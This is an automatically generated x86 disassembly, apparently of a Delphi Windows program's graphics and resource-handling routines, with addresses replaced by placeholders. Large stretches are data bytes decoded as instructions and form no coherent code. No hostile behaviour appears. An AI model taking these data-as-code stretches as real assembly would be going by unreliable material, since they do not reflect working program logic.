add [ eax ] 0x0
add [ eax + 0x50030003 ] al
outsb
mov eax eax
rol [ eax ] 0x42
add [ eax ] cl
push cs
imul esp [ ebx + 0x73 ] 0xff480004
inc ecx
add [ eax + eax ] dl
add bh bh
and al 0x24
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
add eax 0xffffffdc
push eax
jb r-xdata
outsb
jae r-xdata
jb r-xdata
jae r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
push esp
push eax
jb r-xdata
push esp
adc [ eax ] al
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
mov dl 0xdd
jae r-xdata
outsb
mov eax eax
int3
xchg [ esp ] eax
retn
inc ebp
jbe r-xdata
add [ 0x67617453 ] al
push cs
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
jae r-xdata
dec ebp
outsd
in al 0xfc
inc ecx
add [ eax + eax ] cl
add bh bh
or [ edx + eax * 2 ] ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
add [ eax + eax ] ah
inc edx
mov eax [ eax ]
mov eax [ eax + 0x54 ]
ror ah 0x83
je r-xdata
outsb
add [ esp + 0x4 ] 0xffffffdc
jmp r-xdata
jb r-xdata
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
push esp
push eax
jb r-xdata
push cs
add [ ebx + 0x4875840 ] cl
and al 0xc3
add [ esp + 0x4 ] 0xffffffdc
mov eax [ esp + 0x4 ]
je r-xdata
je r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ eax ]
jmp [ eax + 0xc ]
and al 0x4
jae r-xdata
add al 0x8b
add bh bh
pushad
or al 0x83
inc esp
and al 0x4
add [ gs : bp + di ] cl
push eax
jb r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
inc [ ebx - 0x23fbdbbc ]
jmp r-xdata
push ebx
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
fsub st1
adc [ ebx - 0x1 ] ebp
outsb
je r-xdata
pop ebp
retn 0x4
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
mov eax [ eax ]
outsd
outsb
add al 0x42
jns r-xdata
pop ebp
retn 0x4
inc edx
add [ 0x42004201 ] dh
add [ edx ] eax
add [ eax ] eax
add [ eax ] al
mov [ 0x7ab8cd12 ] eax
aam 0x11
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
fnsave [ ebx + 0x1 ]
add [ gs : ecx ] cl
push edx
jb r-xdata
int3
ja r-xdata
outsd
ja r-xdata
adc al [ ecx ]
push edx
add eax 0x63655254
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
jae r-xdata
add ecx [ ebp + 0x73 ]
push es
adc [ ebx + 0x4fc000da ] eax
pushad
push ebx
je r-xdata
push es
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
hlt
rcr ah 0x50
imul ebp [ esi + 0x67 ] 0x83ccc08b
sub_42025c
cld
cmp al 0x42
add [ eax ] cl
push esp
inc edi
jb r-xdata
mov eax [ 0xffffffffaf004202 ]
add al [ edx ]
mov ecx 0x91004202
jo r-xdata
add [ esp + edi * 8 ] dh
inc ecx
add [ eax ] bl
add [ eax ] al
add [ edx ] al
add ch bh
inc ecx
add [ eax ] cl
cmp [ eax ] eax
sub [ ecx + eax * 2 ] ch
sbb [ ecx ] bh
inc eax
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ ebp + eax * 2 + 0x45cc0042 ] bl
inc edx
add [ eax ] dh
dec esp
inc edx
add [ eax - 0x47ffbdb7 ] bl
insb
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al [ edx ]
cdq
add al [ edx ]
add [ eax ] eax
add [ eax ] al
mov [ 0x7ab8cd12 ] eax
aam 0x11
add al [ edx ]
xchg ecx eax
imul esp [ ebx - 0x73 ] 0x2700040
inc edx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
int 0xb8
jpe r-xdata
imul esp [ ebx - 0xc ] 0xf4004201
cmp eax [ ecx ]
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
inc edx
add [ eax + 0x4203 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x3 ] ch
inc edx
add [ eax + 0x3 ] bh
inc edx
add [ eax + eax ] ch
add [ eax ] al
jo r-xdata
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
ffree st6
add al [ edx ]
aam 0x11
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
dec eax
add eax [ edx ]
fiadd [ edx ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] bl
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp sub_424968
sub_42036e
cld
push esp
dec ecx
inc edx
add [ eax ] bl
dec edx
inc edx
add [ eax ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x8d657275
inc eax
add [ eax + 0x7004203 ] cl
or [ eax + edx * 2 + 0x69 ] dl
arpl [ ebp + esi * 2 + 0x72 ] si
dec eax
add eax [ edx ]
hlt
sub_42040c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
add al 0x42
add [ eax + eax ] ah
add [ eax ] al
test al 0x3
inc edx
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ esp + ecx * 2 + 0x4ce80042 ] ch
inc edx
add [ esi ] cl
push esp
dec ebp
je r-xdata
add [ eax - 0x67ffbe94 ] bh
cmp al [ edx ]
clc
dec ebp
inc edx
add [ ebx + edi + 0x42 ] dl
add [ eax - 0x6fffbdb2 ] cl
dec esi
inc edx
add ah dh
dec esi
inc edx
add [ esp + edi + 0x4f800042 ] ah
inc edx
add [ eax + 0x50 ] ah
inc edx
add ah al
push ebx
inc edx
add [ eax - 0x4fffbdc3 ] cl
push esp
inc edx
add [ esp + edx * 2 + 0x560c0042 ] dh
inc edx
add ah ch
dec esp
inc edx
add [ eax + 0x1c00423c ] ch
push ebx
inc edx
add ah ah
dec edi
inc edx
add [ eax + 0x64004253 ] ch
pop eax
inc edx
add al ch
pop eax
inc edx
add [ ecx ] cl
push esp
dec ebp
je r-xdata
imul bp [ ebp + 0x49 ] 0x616d
nop
mov ah 0x4
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
add eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ 0x300042 ] al
add [ eax ] al
test al 0x1
inc edx
add [ eax ] cl
cmp [ eax ] eax
sub [ ecx + eax * 2 ] ch
sbb [ ecx ] bh
inc eax
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ ecx * 2 + 0x6b680042 ] dh
inc ecx
add [ eax ] cl
cmp eax [ edx ]
dec ebp
inc edx
add [ ecx + edi ] bl
imul bp [ ebp - 0x75 ] 0x28c0
add eax 0x9070042
push esp
dec ebp
je r-xdata
pop esp
inc edx
add [ ebp + ebx * 2 + 0x42 ] dl
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
clc
imul bp [ ebp - 0x4c ] 0x4204
add [ edx + eax + 0x42 ] ch
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
lea eax [ bx + si ]
hlt
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6 ] dh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax + 0x42 ] ah
add [ eax + eax ] bh
add [ eax ] al
test al 0x1
inc edx
add [ eax ] cl
cmp [ eax ] eax
sub [ ecx + eax * 2 ] ch
sbb [ ecx ] bh
inc eax
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add ah ah
inc edx
add [ eax + 0x6b ] ch
inc ecx
add [ eax ] cl
cmp eax [ edx ]
and [ eax + 0x42 ] ch
add [ eax - 0xbffbe94 ] bh
imul eax [ edx ] sub_426a74
push esp
cmp eax [ edx ]
sub [ ebp + 0x42 ] ch
add ah bl
insd
inc edx
add [ esi + ebp * 2 ] bl
inc edx
add [ esp + edi + 0x6e780042 ] ah
inc edx
add ah al
jb r-xdata
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add al bh
imul esp [ ebx + 0x73 ] 0x5940000
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x74004205 ] bl
add [ eax ] al
add [ eax + 0x8004203 ] ch
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
insd
popad
jo r-xdata
add al al
jpe r-xdata
add [ edx ] 0xa
push esp
push es
inc edx
add [ ebx + edi * 2 + 0x3d8c0042 ] dl
inc edx
add [ eax + 0xc00427c ] bh
jge r-xdata
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
add [ eax + eax * 4 + 0x42 ] dh
add [ eax + eax * 4 + 0x540a0042 ] ah
inc edx
add [ edx + eax * 4 ] cl
inc edx
add [ eax - 0x5bffbdc4 ] ah
cmp al 0x42
add [ eax ] ah
add [ edx ] 0x24
cmp eax 0x84a40042
inc edx
add [ eax - 0x43ffbdc3 ] cl
test [ edx ] al
rol [ edx + eax * 2 + 0x423d9c00 ] 0x0
mov esp 0xa8004280
cmp al 0x42
add [ eax ] dh
cmp eax 0x83600042
inc edx
add al bl
test [ edx ] al
add al 0x85
inc edx
add [ eax ] bl
test [ edx ] eax
add eax 0x6f634954
outsb
mov eax eax
test al 0x7
inc edx
add [ edi ] al
add eax 0x6f634954
outsb
cmp [ edi ] al
inc edx
add [ edx + eax + 0x42 ] ch
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
popad
nop
cmp [ edi ] al
inc edx
add [ eax ] al
jo r-xdata
insb
add al [ edx ]
add [ eax ] al
or [ edi + 0x72 ] al
popad
add [ edi + 0x42 ] bh
add [ eax + 0x3000423c ] ch
cmp eax 0x71400042
inc edx
add ah cl
jg r-xdata
inc eax
add [ eax + 0x10004208 ] cl
push esp
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4207 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax + 0x340042 ] bl
add [ eax ] al
test al 0x1
inc edx
add [ eax ] cl
cmp [ eax ] eax
sub [ ecx + eax * 2 ] ch
sbb [ ecx ] bh
inc eax
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax ] dl
add [ edx ] sub_416b68
or [ ebx ] bh
inc edx
add [ eax - 0x7f ] al
inc edx
add [ eax - 0x67ffbe94 ] bh
cmp al [ edx ]
mov al [ 0x54004281 ]
cmp eax [ edx ]
loopne r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
fadd [ esi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
push es
inc edx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x8004203 ] ch
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
push es
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x4205f470
add [ edx + eax + 0x42 ] ch
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax + esi * 2 + 0x7fd40042 ] bh
inc edx
add [ ebp + ebp * 2 + 0x6dec0042 ] cl
inc edx
add [ eax + 0x7004279 ] cl
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x42067070
popad
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_4205ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
inc edx
add [ eax + eax ] bh
add [ eax ] al
test al 0x1
inc edx
add [ eax ] cl
cmp [ eax ] eax
sub [ ecx + eax * 2 ] ch
sbb [ ecx ] bh
inc eax
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add ah ah
inc edx
add [ eax + 0x6b ] ch
inc ecx
add [ eax ] cl
cmp eax [ edx ]
and [ eax + 0x42 ] ch
add [ eax - 0xbffbe94 ] bh
imul eax [ edx ] sub_426a74
push esp
cmp eax [ edx ]
sub [ ebp + 0x42 ] ch
add ah bl
insd
inc edx
add [ esi + ebp * 2 ] bl
inc edx
add [ esp + edi + 0x6e780042 ] ah
inc edx
add ah al
jb r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax + 0x42 ] ah
insd
popad
jo r-xdata
add al al
jpe r-xdata
add [ edx ] 0xa
push esp
push es
inc edx
add [ ebx + edi * 2 + 0x3d8c0042 ] dl
inc edx
add [ eax + 0xc00427c ] bh
jge r-xdata
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
add [ eax + eax * 4 + 0x42 ] dh
add [ eax + eax * 4 + 0x540a0042 ] ah
inc edx
add [ edx + eax * 4 ] cl
inc edx
add [ eax - 0x5bffbdc4 ] ah
cmp al 0x42
add [ eax ] ah
add [ edx ] 0x24
cmp eax 0x84a40042
inc edx
add [ eax - 0x43ffbdc3 ] cl
test [ edx ] al
rol [ edx + eax * 2 + 0x423d9c00 ] 0x0
mov esp 0xa8004280
cmp al 0x42
add [ eax ] dh
cmp eax 0x83600042
inc edx
add al bl
test [ edx ] al
add al 0x85
inc edx
add [ eax ] bl
test [ edx ] eax
add eax 0x6f634954
outsb
mov eax eax
test al 0x7
inc edx
add [ edi ] al
add eax 0x6f634954
outsb
cmp [ edi ] al
inc edx
add [ edx + eax + 0x42 ] ch
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
popad
nop
cmp [ edi ] al
inc edx
add [ eax ] al
jo r-xdata
insb
add al [ edx ]
add [ eax ] al
or [ edi + 0x72 ] al
popad
add [ edi + 0x42 ] bh
add [ eax + 0x3000423c ] ch
cmp eax 0x71400042
inc edx
add ah cl
jg r-xdata
inc eax
add [ eax + 0x10004208 ] cl
push esp
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4207 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax + 0x340042 ] bl
add [ eax ] al
test al 0x1
inc edx
add [ eax ] cl
cmp [ eax ] eax
sub [ ecx + eax * 2 ] ch
sbb [ ecx ] bh
inc eax
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax ] dl
add [ edx ] sub_416b68
or [ ebx ] bh
inc edx
add [ eax - 0x7f ] al
inc edx
add [ eax - 0x67ffbe94 ] bh
cmp al [ edx ]
mov al [ 0x54004281 ]
cmp eax [ edx ]
loopne r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
fadd [ esi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
push es
inc edx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x8004203 ] ch
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
push es
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x4205f470
add [ edx + eax + 0x42 ] ch
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax + esi * 2 + 0x7fd40042 ] bh
inc edx
add [ ebp + ebp * 2 + 0x6dec0042 ] cl
inc edx
add [ eax + 0x7004279 ] cl
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x42067070
popad
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_4207d8
and al 0x8
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx ] ah
inc edx
add [ eax + eax ] ah
add [ eax ] al
fcom [ eax ]
inc eax
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x10004208 ] cl
push esp
push edx
jae r-xdata
popad
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_42084c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_420888
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_4208c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_420838
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4208ac
xor edx edx
push ebp
push sub_420998
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42099f
mov eax [ ebp - 0x4 ]
call sub_4208b8
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_402744
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028fc
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_4086c8
test al al
je r-xdata
sub_4209a8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4208ac
xor ecx ecx
push ebp
push sub_420a2f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4208b8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_420a58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4208ac
xor eax eax
push ebp
push sub_420ac1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4208c4
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4209a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420ac8
mov eax [ ebp - 0x4 ]
call sub_4208b8
retn
mov eax ebx
mov si 0xfffd
call sub_4038bc
sub_420ad0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4208ac
xor eax eax
push ebp
push sub_420b2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420b33
mov eax [ ebp - 0x4 ]
call sub_4208b8
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_4038bc
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4209a8
sub_420b3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4208ac
xor edx edx
push ebp
push sub_420b9b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420ba2
mov eax [ ebp - 0x4 ]
call sub_4208b8
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_420ba8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_416834
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420c45
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4161a0
mov ebx eax
mov eax ebx
call sub_422134
inc [ ebp - 0x4 ]
mov eax ebx
call sub_422508
mov eax [ rw-data ]
call sub_420b3c
mov eax [ rw-data ]
call sub_420b3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420c4c
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_416898
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4161a0
call sub_4223e0
inc esi
dec ebx
jne r-xdata
sub_42125b
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_415ac0
retn
sub_42128c
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_4031d0
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402eb4
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_421340
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_4208c4
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x80000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_421394
push ebx
push esi
call sub_403a8c
